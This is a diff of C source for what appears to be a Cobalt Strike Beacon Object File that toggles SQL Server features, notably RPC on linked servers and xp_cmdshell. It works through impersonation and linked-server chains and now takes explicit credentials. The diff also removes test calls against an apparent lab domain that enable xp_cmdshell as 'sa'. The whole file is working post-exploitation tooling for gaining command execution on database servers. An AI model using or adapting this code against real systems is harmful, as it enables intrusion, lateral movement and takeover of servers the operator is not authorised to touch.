@@ -1,197 +1,123 @@
-#include "bofdefs.h"
 #include "base.c"
+#include "bofdefs.h"
 #include "sql.c"
 #include "sql_modules.c"
 
+void ToggleRpc(char *server, char *database, char *link, char *impersonate, char *value, char *user, char *password) {
+  SQLHENV env = NULL;
+  SQLHSTMT stmt = NULL;
+  SQLHDBC dbc = NULL;
 
-// rpc requires different functions/values than the other modules
-void ToggleRpc(char* server, char* database, char* link, char* impersonate, char* value)
-{
-    SQLHENV env		= NULL;
-    SQLHSTMT stmt 	= NULL;
-	SQLHDBC dbc 	= NULL;
+  dbc = ConnectToSqlServerAuth(&env, server, database, user, password);
 
-	dbc = ConnectToSqlServer(&env, server, database);
+  if (dbc == NULL) {
+    goto END;
+  }
 
-    if (dbc == NULL) {
-		goto END;
-	}
+  internal_printf("[*] Toggling RPC on %s...\n\n", link);
 
-	internal_printf("[*] Toggling RPC on %s...\n\n", link);
+  ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
 
-	//
-	// allocate statement handle
-	//
-	ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
+  if (!ToggleModule(stmt, "rpc", value, link, impersonate)) {
+    goto END;
+  }
 
-	if (!ToggleModule(stmt, "rpc", value, link, impersonate))
-	{
-		goto END;
-	}
+  ODBC32$SQLCloseCursor(stmt);
 
-	//
-	// Close the cursor
-	//
-	ODBC32$SQLCloseCursor(stmt);
+  if (!CheckRpcOnLink(stmt, link, impersonate)) {
+    goto END;
+  }
 
-	
-	if (!CheckRpcOnLink(stmt, link, impersonate))
-	{
-		goto END;
-	}
+  PrintQueryResults(stmt, TRUE);
 
-	PrintQueryResults(stmt, TRUE);
-
-	//
-	// close the cursor
-	//
-	ODBC32$SQLCloseCursor(stmt);
+  ODBC32$SQLCloseCursor(stmt);
 
 END:
-	DisconnectSqlServer(env, dbc, stmt);
+  DisconnectSqlServer(env, dbc, stmt);
 }
 
+void ToggleGenericModule(char *server, char *database, char *link, char *impersonate, char *module, char *value, char *user, char *password) {
+  SQLHENV env = NULL;
+  SQLHSTMT stmt = NULL;
+  SQLHDBC dbc = NULL;
 
-// non-rpc modules are treated the same
-void ToggleGenericModule(char* server, char* database, char* link, char* impersonate, char* module, char* value)
-{
-    SQLHENV env		= NULL;
-    SQLHSTMT stmt 	= NULL;
-	SQLHDBC dbc 	= NULL;
+  dbc = ConnectToSqlServerAuth(&env, server, database, user, password);
 
-	dbc = ConnectToSqlServer(&env, server, database);
+  if (dbc == NULL) {
+    goto END;
+  }
 
-    if (dbc == NULL) {
-		goto END;
-	}
+  ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
 
-	//
-	// allocate statement handle
-	//
-	ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
+  if (link == NULL) {
+    internal_printf("[*] Toggling %s on %s...\n\n", module, server);
+  } else {
+    internal_printf("[*] Toggling %s on %s via %s\n\n", module, link, server);
+  }
 
-	if (link == NULL)
-	{
-		internal_printf("[*] Toggling %s on %s...\n\n", module, server);
-	}
-	else
-	{
-		internal_printf("[*] Toggling %s on %s via %s\n\n", module, link, server);
-	}
-	
-	if (!ToggleModule(stmt, module, value, link, impersonate))
-	{
-		goto END;
-	}
+  if (!ToggleModule(stmt, module, value, link, impersonate)) {
+    goto END;
+  }
 
-	//
-	// Close the cursor
-	//
-	ODBC32$SQLCloseCursor(stmt);
+  ODBC32$SQLCloseCursor(stmt);
 
-	//
-	// Check new status and print
-	//
+  CheckModuleStatus(stmt, module, link, impersonate);
 
-	CheckModuleStatus(stmt, module, link, impersonate);
-
-	PrintQueryResults(stmt, TRUE);
+  PrintQueryResults(stmt, TRUE);
 
 END:
-	ODBC32$SQLCloseCursor(stmt);
-	DisconnectSqlServer(env, dbc, stmt);
+  ODBC32$SQLCloseCursor(stmt);
+  DisconnectSqlServer(env, dbc, stmt);
 }
 
+VOID go(IN PCHAR Buffer, IN ULONG Length) {
+  char *server;
+  char *database;
+  char *link;
+  char *impersonate;
+  char *module;
+  char *value;
+  char *user;
+  char *password;
 
-#ifdef BOF
-VOID go( 
-	IN PCHAR Buffer, 
-	IN ULONG Length 
-) 
-{
-	char* server;
-	char* database;
-	char* link;
-	char* impersonate;
-	char* module;
-	char* value;
+  datap parser;
+  BeaconDataParse(&parser, Buffer, Length);
 
-	//
-	// parse beacon args 
-	//
-	datap parser;
-	BeaconDataParse(&parser, Buffer, Length);
-	
-	server	 	= BeaconDataExtract(&parser, NULL);
-	database 	= BeaconDataExtract(&parser, NULL);
-	link 		= BeaconDataExtract(&parser, NULL);
-	impersonate = BeaconDataExtract(&parser, NULL);
-	module 		= BeaconDataExtract(&parser, NULL);
-	value 		= BeaconDataExtract(&parser, NULL);
+  server = BeaconDataExtract(&parser, NULL);
+  database = BeaconDataExtract(&parser, NULL);
+  link = BeaconDataExtract(&parser, NULL);
+  impersonate = BeaconDataExtract(&parser, NULL);
+  module = BeaconDataExtract(&parser, NULL);
+  value = BeaconDataExtract(&parser, NULL);
+  user = BeaconDataExtract(&parser, NULL);
+  password = BeaconDataExtract(&parser, NULL);
 
-	server = *server == 0 ? "localhost" : server;
-	database = *database == 0 ? "master" : database;
-	link = *link  == 0 ? NULL : link;
-	impersonate = *impersonate == 0 ?  NULL : impersonate;
+  server = *server == 0 ? "localhost" : server;
+  database = *database == 0 ? "master" : database;
+  link = *link == 0 ? NULL : link;
+  impersonate = *impersonate == 0 ? NULL : impersonate;
+  user = *user == 0 ? NULL : user;
+  password = *password == 0 ? NULL : password;
 
-	if(!bofstart())
-	{
-		return;
-	}
+  if (!bofstart()) {
+    return;
+  }
 
-	// we're toggling RPC
-	if (MSVCRT$strcmp(module, "rpc") == 0)
-	{
-		if (link == NULL)
-		{
-			internal_printf("[!] A link must be specified\n");
-			printoutput(TRUE);
-			return;
-		}
-		ToggleRpc(server, database, link, impersonate, value);
-	}
-	// we're toggling one of the other modules that we treat the same
-	else
-	{
-		if (UsingLinkAndImpersonate(link, impersonate))
-		{
-			return;
-		}
+  if (MSVCRT$strcmp(module, "rpc") == 0) {
+    if (link == NULL) {
+      internal_printf("[!] A link must be specified\n");
+      printoutput(TRUE);
+      return;
+    }
+    ToggleRpc(server, database, link, impersonate, value, user, password);
+  }
+  else {
+    if (UsingLinkAndImpersonate(link, impersonate)) {
+      return;
+    }
 
-		ToggleGenericModule(server, database, link, impersonate, module, value);
-	}
-	
+    ToggleGenericModule(server, database, link, impersonate, module, value, user, password);
+  }
 
-	printoutput(TRUE);
+  printoutput(TRUE);
 };
-
-#else
-
-int main()
-{
-	internal_printf("============ LINK RPC DISABLE TEST ============\n\n");
-	ToggleRpc("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "FALSE");
-
-	internal_printf("\n\n============ LINK RPC ENABLE TEST ============\n\n");
-	ToggleRpc("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "TRUE");
-
-	internal_printf("\n\n============ BASE XP_CMDSHELL DISABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "xp_cmdshell", "0");
-
-	internal_printf("\n\n============ BASE XP_CMDSHELL ENABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "xp_cmdshell", "1");
-
-	internal_printf("\n\n============ IMPERSONATE XP_CMDSHELL DISABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "xp_cmdshell", "0");
-
-	internal_printf("\n\n============ IMPERSONATE XP_CMDSHELL ENABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "xp_cmdshell", "1");	
-
-	internal_printf("\n\n============ LINK XP_CMDSHELL DISABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "xp_cmdshell", "0");
-
-	internal_printf("\n\n============ LINK XP_CMDSHELL ENABLE TEST ============\n\n");
-	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "xp_cmdshell", "1");
-}
-
-#endif
